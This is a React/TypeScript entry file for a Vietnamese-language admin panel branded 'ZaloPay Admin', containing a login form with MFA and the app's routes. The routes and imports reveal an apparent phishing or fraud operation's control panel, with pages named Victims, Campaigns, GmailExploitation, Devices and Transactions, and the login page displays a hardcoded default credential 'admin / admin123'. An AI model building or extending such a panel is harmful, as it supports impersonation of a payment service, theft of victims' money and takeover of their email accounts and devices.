
import React, { useState, useEffect } from 'react';
import { Route, Switch, Router, useLocation } from 'wouter';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { Toaster } from './shared/components/ui/toaster';
import { AuthService } from './shared/lib/auth';
import { MFAInput } from './shared/components/auth/mfa-input';

// Import pages
import Dashboard from './domains/user/dashboard';
import Victims from './domains/victims/victims';
import Campaigns from './domains/campaigns/campaigns';
import GmailExploitation from './domains/gmail/gmail-exploitation';
import ActivityLogs from './domains/activity/activity-logs';
import Transactions from './domains/transactions/transactions';
import Verifications from './domains/verification/verifications';
import Partners from './domains/partners/partners';
import PartnerDetail from './domains/partners/partner-detail';
import AdvancedReports from './domains/reports/advanced-reports';
import Settings from './domains/user/settings';
import MFASetup from './domains/auth/mfa-setup';
import { Devices } from './domains/devices/devices';
import { DeviceDetail } from './domains/devices/device-detail';
import Header from './shared/components/layout/header';
import Sidebar from './shared/components/layout/sidebar';
import NotFound from './shared/not-found';

// Login component with MFA support
const Login: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [mfaCode, setMfaCode] = useState('');
  const [backupCode, setBackupCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [requiresMFA, setRequiresMFA] = useState(false);
  const [useBackupCode, setUseBackupCode] = useState(false);
  const [, setLocation] = useLocation();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      if (requiresMFA) {
        // Verify MFA code
        const response = await fetch('/api/admin/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username,
            password,
            mfa_code: useBackupCode ? null : mfaCode,
            backup_code: useBackupCode ? backupCode : null,
          }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.error || 'Mã xác thực không hợp lệ');
        }

        const data = await response.json();
        localStorage.setItem('zalopay_admin_token', data.token);
        localStorage.setItem('zalopay_admin_user', JSON.stringify(data.user));
        setLocation('/');
      } else {
        // Initial login
        const response = await fetch('/api/admin/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          if (errorData.requires_mfa) {
            setRequiresMFA(true);
            return;
          }
          throw new Error(errorData.error || 'Tên đăng nhập hoặc mật khẩu không đúng');
        }

        const data = await response.json();
        localStorage.setItem('zalopay_admin_token', data.token);
        localStorage.setItem('zalopay_admin_user', JSON.stringify(data.user));
        setLocation('/');
      }
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Lỗi đăng nhập. Vui lòng thử lại.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center">
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-gray-900">ZaloPay Admin</h1>
          <p className="text-gray-600 mt-2">Đăng nhập để quản lý hệ thống</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Tên đăng nhập
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
              disabled={loading}
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Mật khẩu
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
              disabled={loading}
            />
          </div>

          {requiresMFA && (
            <div className="space-y-4">
              <div className="bg-blue-50 border border-blue-200 rounded-md p-3">
                <p className="text-blue-800 text-sm font-medium mb-1">
                  Xác thực hai yếu tố (MFA) được yêu cầu
                </p>
                <p className="text-blue-700 text-xs">
                  Nhập mã 6 chữ số từ ứng dụng xác thực của bạn
                </p>
              </div>

              {!useBackupCode ? (
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Mã xác thực
                  </label>
                  <MFAInput
                    value={mfaCode}
                    onChange={setMfaCode}
                    disabled={loading}
                    error={error}
                  />
                  <button
                    type="button"
                    onClick={() => {
                      setUseBackupCode(true);
                      setMfaCode('');
                      setError('');
                    }}
                    className="mt-2 text-sm text-blue-600 hover:text-blue-800"
                  >
                    Sử dụng mã dự phòng
                  </button>
                </div>
              ) : (
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Mã dự phòng
                  </label>
                  <MFAInput
                    value={backupCode}
                    onChange={setBackupCode}
                    length={8}
                    disabled={loading}
                    error={error}
                    placeholder="Nhập mã dự phòng 8 ký tự"
                  />
                  <button
                    type="button"
                    onClick={() => {
                      setUseBackupCode(false);
                      setBackupCode('');
                      setError('');
                    }}
                    className="mt-2 text-sm text-blue-600 hover:text-blue-800"
                  >
                    Sử dụng mã xác thực
                  </button>
                </div>
              )}
            </div>
          )}

          {error && (
            <div className="bg-red-50 border border-red-200 rounded-md p-3">
              <p className="text-red-600 text-sm">{error}</p>
            </div>
          )}

          <button
            type="submit"
            disabled={loading || (requiresMFA && !useBackupCode && mfaCode.length !== 6) || (requiresMFA && useBackupCode && backupCode.length !== 8)}
            className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
          >
            {loading ? 'Đang đăng nhập...' : requiresMFA ? 'Xác thực' : 'Đăng nhập'}
          </button>
        </form>

        <div className="mt-6 text-center text-sm text-gray-500">
          <p>Tài khoản mặc định: admin / admin123</p>
        </div>
      </div>
    </div>
  );
};

// Main App Layout
const AppLayout: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [sidebarOpen, setSidebarOpen] = useState(false);

  return (
    <div className="min-h-screen bg-gray-50">
      <Header onMenuClick={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex">
        <Sidebar isOpen={sidebarOpen} onClose={() => setSidebarOpen(false)} />
        <main className="flex-1 lg:ml-64">
          {children}
        </main>
      </div>
    </div>
  );
};

// Protected Route wrapper
const ProtectedRoute: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null);
  const [, setLocation] = useLocation();

  useEffect(() => {
    const checkAuth = async () => {
      const authenticated = await AuthService.isAuthenticated();
      setIsAuthenticated(authenticated);
      if (!authenticated) {
        setLocation('/login');
      }
    };
    checkAuth();
  }, [setLocation]);

  if (isAuthenticated === null) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return null;
  }

  return <AppLayout>{children}</AppLayout>;
};

// Create QueryClient
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      retry: 1,
      refetchOnWindowFocus: false,
    },
  },
});

// Main App component
const App: React.FC = () => {
  return (
    <QueryClientProvider client={queryClient}>
      <Router base="/admin">
        <Switch>
          <Route path="/login" component={Login} />
          
          <Route path="/">
            <ProtectedRoute>
              <Dashboard />
            </ProtectedRoute>
          </Route>
          
          <Route path="/victims">
            <ProtectedRoute>
              <Victims />
            </ProtectedRoute>
          </Route>
          
          <Route path="/registrations">
            <ProtectedRoute>
              <Victims />
            </ProtectedRoute>
          </Route>

          <Route path="/campaigns">
            <ProtectedRoute>
              <Campaigns />
            </ProtectedRoute>
          </Route>

          <Route path="/gmail">
            <ProtectedRoute>
              <GmailExploitation />
            </ProtectedRoute>
          </Route>

          <Route path="/activity-logs">
            <ProtectedRoute>
              <ActivityLogs />
            </ProtectedRoute>
          </Route>

          <Route path="/devices">
            <ProtectedRoute>
              <Devices />
            </ProtectedRoute>
          </Route>

          <Route path="/devices/:id">
            <ProtectedRoute>
              <DeviceDetail />
            </ProtectedRoute>
          </Route>
          
          <Route path="/transactions">
            <ProtectedRoute>
              <Transactions />
            </ProtectedRoute>
          </Route>
          
          <Route path="/verifications">
            <ProtectedRoute>
              <Verifications />
            </ProtectedRoute>
          </Route>

          <Route path="/partners">
            <ProtectedRoute>
              <Partners />
            </ProtectedRoute>
          </Route>

          <Route path="/partners/:id">
            <ProtectedRoute>
              <PartnerDetail />
            </ProtectedRoute>
          </Route>

          <Route path="/reports">
            <ProtectedRoute>
              <AdvancedReports />
            </ProtectedRoute>
          </Route>

          <Route path="/settings">
            <ProtectedRoute>
              <Settings />
            </ProtectedRoute>
          </Route>

          <Route path="/mfa-setup">
            <ProtectedRoute>
              <MFASetup />
            </ProtectedRoute>
          </Route>
          
          <Route>
            <NotFound />
          </Route>
        </Switch>
      </Router>
      <Toaster />
    </QueryClientProvider>
  );
};

export default App;
